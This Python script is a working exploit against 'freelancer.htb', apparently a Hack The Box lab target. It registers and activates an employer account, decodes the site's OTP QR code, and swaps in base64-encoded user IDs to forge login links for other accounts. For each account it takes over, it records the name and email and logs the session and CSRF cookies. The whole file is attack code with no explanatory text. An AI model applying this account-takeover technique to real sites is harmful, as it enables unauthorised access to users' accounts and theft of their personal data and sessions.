import requests
import cv2
import numpy as np
import base64
import sys
import logging

from bs4 import BeautifulSoup
from pyzbar import pyzbar


def setup_logging():
	logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def download_image(url, session, image_path):
	try:
		response = session.get(url)
		response.raise_for_status()
		with open(image_path, 'wb') as file:
			file.write(response.content)
		logging.info(f"Image successfully downloaded: {image_path}")
	except requests.RequestException as e:
		logging.error(f"Failed to download image: {e}")


def decode_qr_code(image_path):
	image = cv2.imread(image_path)
	decoded_objects = pyzbar.decode(image)
	
	if not decoded_objects:
		logging.warning(f"No QR code found in image: {image_path}")
		return None

	for obj in decoded_objects:
		return obj.data.decode("utf-8")


def get_csrf_token(session, url):
	response = session.get(url)
	soup = BeautifulSoup(response.text, 'html.parser')
	csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
	
	return csrf_token


def login(session, username, password):
	url = 'http://freelancer.htb/accounts/login/'

	csrf_token = get_csrf_token(session, url)
	data = {
		'username': username,
		'password': password,
		'csrfmiddlewaretoken': csrf_token
	}
	response = session.post(url, data=data)
	if 'Freelancer | Login' in response.text:
		logging.error('Login failed')
		sys.exit()
	
	logging.info('Logged in successfully')


def process_uid(session, uid, qr_code_url, image_path):
	download_image(qr_code_url, session, image_path)
	link = decode_qr_code(image_path)

	if not link:
		return None

	token = link.split('/')[-2]
	encoded_uid = base64.b64encode(str(uid).encode('utf-8')).decode('utf-8')
	return f'http://freelancer.htb/accounts/login/otp/{encoded_uid}/{token}'


def fetch_user_details(url):
	otp_session = requests.Session()
	response = otp_session.get(url)
	
	if 'invalid' in response.text.lower() or 'Freelancer | Login' in response.text:
		return None

	soup = BeautifulSoup(response.text, 'html.parser')
	name = soup.find('span', class_='name').text
	email = soup.find('p', class_='mb-3 email').text.lower()
	return name, email, response.text, otp_session.cookies


def save_user_data(name, email, html_content, cookies):
	with open('emails.txt', 'a') as f:
		f.write(email + '\n')

	username = email.split('@')[0].lower()
	with open('users.txt', 'a') as f:
		f.write(username + '\n')

	logging.info(f"Hit on UID with name: {name}, email: {email}")
	logging.info(f"Session ID: {cookies['sessionid']}, CSRF token: {cookies['csrftoken']}")


def create_account(username: str, password: str, session: object) -> bool:
	url = 'http://freelancer.htb/employer/register/'
	
	# Get CSRF token
	csrf_token = get_csrf_token(session, url)

	# Define the payload
	payload = {
		'csrfmiddlewaretoken': csrf_token,
		'username': username,
		'email': f'{username}@behindsecurity.com',
		'first_name': 'hacker',
		'last_name': 'hacker',
		'address': 'hacker',
		'security_q1': 'hacker',
		'security_q2': 'hacker',
		'security_q3': 'hacker',
		'company_name': 'hacker',
		'password1': password,
		'password2': password
	}
	
	# Send POST request to create account
	response = session.post(url, data=payload)

	# Check for errors in the response
	soup = BeautifulSoup(response.text, 'html.parser')
	
	error_list = soup.find('ul', {'class': 'errorlist'})
	if error_list:
		error_message = error_list.find('li').text
		logging.error(f'Error when creating account: {error_message}')

		return False
	
	logging.info(f'Account created -> {username}:{password}')
	return True


def recover_account(username: str, session: object):
	url = 'http://freelancer.htb/accounts/recovery/'
	
	# Get CSRF token
	csrf_token = get_csrf_token(session, url)
	
	# Define the payload
	payload = {
		'csrfmiddlewaretoken': csrf_token,
		'username': username,
		'security_q1': 'hacker',
		'security_q2': 'hacker',
		'security_q3': 'hacker'
	}
		
	# Send POST request to recover account
	response = session.post(url, data=payload)
	
	# Check for errors in the response
	soup = BeautifulSoup(response.text, 'html.parser')
	error_list = soup.find('ul', {'class': 'errorlist'})
	if error_list:
		error_message = error_list.find('li').text
		logging.error(f'Error when activating account: {error_message}')
	else:
		logging.info(f'{username} account has been activated!')


def main():
	setup_logging()

	session = requests.Session()

	if create_account('behindsecurity', '#SuperSecurePassword1337', session):
		recover_account('behindsecurity', session)

	qr_code_url = 'http://freelancer.htb/accounts/otp/qrcode/generate/'
	image_path = './freelancer.png'

	login(session, 'behindsecurity', '#SuperSecurePassword1337')

	for uid in range(0, 20):
		logging.info(f'Trying UID {uid}...')
		otp_url = process_uid(session, uid, qr_code_url, image_path)

		if otp_url:
			user_details = fetch_user_details(otp_url)
			if user_details:
				save_user_data(*user_details)


if __name__ == '__main__':
	main()
